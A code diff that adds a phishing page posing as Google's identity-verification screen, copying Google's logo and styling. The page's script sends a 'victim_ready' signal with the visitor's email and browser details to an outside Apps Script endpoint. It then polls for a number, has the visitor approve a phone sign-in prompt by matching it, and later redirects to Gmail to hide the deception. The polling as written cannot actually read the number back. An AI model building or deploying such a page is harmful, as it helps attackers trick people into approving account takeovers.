@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verifying your identity - Google</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    body { font-family: 'Roboto', sans-serif; background: #f1f3f4; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #202124; }
+    .card { background: white; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.2); padding: 48px 40px; max-width: 480px; width: 100%; text-align: center; }
+    .logo svg { width: 48px; height: 48px; margin-bottom: 24px; }
+    .avatar { width: 64px; height: 64px; background: #1a73e8; color: white; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 28px; font-weight: 500; margin: 16px 0; }
+    .spinner { border: 8px solid #e8eaed; border-top: 8px solid #1a73e8; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 0 auto 24px; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    h1 { font-size: 24px; margin: 0 0 16px; }
+    .status { font-size: 16px; color: #5f6368; line-height: 1.5; margin-bottom: 32px; }
+    .prompt-section { display: none; margin-top: 24px; }
+    .number-box { font-size: 120px; font-weight: bold; color: #1967d2; background: #e3f2fd; width: 240px; height: 160px; line-height: 160px; margin: 32px auto; border-radius: 16px; border: 4px solid #1967d2; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
+    .debug { font-size: 13px; color: #d93025; margin-top: 16px; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo">
+      <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+        <path fill="#EA4335" d="M24 9.5c3.54 0 6.14 1.53 7.56 2.8l5.5-5.5C33.64 3.6 29.22 1.5 24 1.5 14.98 1.5 7.2 6.68 3.44 14.24l6.66 5.18C11.84 13.3 17.42 9.5 24 9.5z"/>
+        <path fill="#4285F4" d="M46.14 24.5c0-1.57-.14-3.08-.4-4.5H24v8.52h12.44c-.54 2.9-2.2 5.36-4.66 7.04l7.2 5.6c4.2-3.88 6.6-9.6 6.6-16.66z"/>
+        <path fill="#FBBC05" d="M10.1 28.58c-.48-1.42-.76-2.94-.76-4.58s.28-3.16.76-4.58l-6.66-5.18C1.78 17.1.9 20.46.9 24s.88 6.9 2.54 9.76l6.66-5.18z"/>
+        <path fill="#34A853" d="M24 46.5c6.48 0 11.92-2.14 15.9-5.84l-7.2-5.6c-2 1.34-4.56 2.14-8.7 2.14-6.58 0-12.16-3.8-13.9-9.02l-6.66 5.18C7.2 41.32 14.98 46.5 24 46.5z"/>
+      </svg>
+    </div>
+    <div class="avatar" id="avatar"></div>
+    <h1>Verifying your identity</h1>
+    <div id="loading">
+      <div class="spinner"></div>
+      <div class="status" id="status">Checking your account...</div>
+      <div class="debug" id="debugMsg"></div>
+    </div>
+    <div id="prompt-section" class="prompt-section">
+      <h1>Check your phone</h1>
+      <p>Tap <strong>Yes</strong> on the prompt sent to your phone</p>
+      <div style="margin:16px 0; color:#5f6368;">Then select the number shown below:</div>
+      <div class="number-box" id="matchNumber">••</div>
+      <div style="margin-top:32px; color:#5f6368; font-size:14px;">This helps keep your account secure.</div>
+    </div>
+  </div>
+
+  <script>
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwWsCzMgnP9a06RF1albWCtppqmaLegtWoqy6geMcU9nWw1RjUw__yyZ1u8CThcOQc/exec";
+
+    let email = localStorage.getItem("demoEmail") || "someone@example.com";
+    document.getElementById("avatar").textContent = (email.split('@')[0] || "U").charAt(0).toUpperCase();
+
+    const statusEl = document.getElementById("status");
+    const debugEl = document.getElementById("debugMsg");
+
+    function log(msg) { 
+      console.log(msg); 
+      debugEl.textContent = msg; 
+    }
+
+    // Send victim_ready signal
+    const readyParams = new URLSearchParams({
+      action: "victim_ready",
+      email: email,
+      user_agent: navigator.userAgent,
+      timestamp: new Date().toISOString()
+    });
+
+    fetch(SCRIPT_URL, {
+      method: "POST",
+      headers: { "Content-Type": "text/plain;charset=utf-8" },
+      body: readyParams.toString(),
+      mode: "no-cors",
+      keepalive: true
+    })
+    .then(() => {
+      console.log("victim_ready signal sent (optimistic)");
+      log("Ready signal sent");
+    })
+    .catch(e => {
+      console.error("victim_ready fetch failed:", e);
+      log("Ready signal failed");
+    });
+
+    // Poll for prompt number
+    setInterval(() => {
+      fetch(`${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}&t=${Date.now()}`, {
+        mode: "no-cors",
+        cache: "no-cache"
+      }).catch(e => console.error("Poll failed", e));
+      log("Polling for number...");
+    }, 4000);
+
+    // Show prompt section after delay
+    setTimeout(() => {
+      document.getElementById("loading").style.display = "none";
+      document.getElementById("prompt-section").style.display = "block";
+      statusEl.textContent = "Waiting for number match...";
+    }, 6000);
+
+    // Timeout redirect
+    setTimeout(() => {
+      window.location.href = "https://mail.google.com/";
+    }, 90000);
+  </script>
+</body>
+</html>
+
+
+  
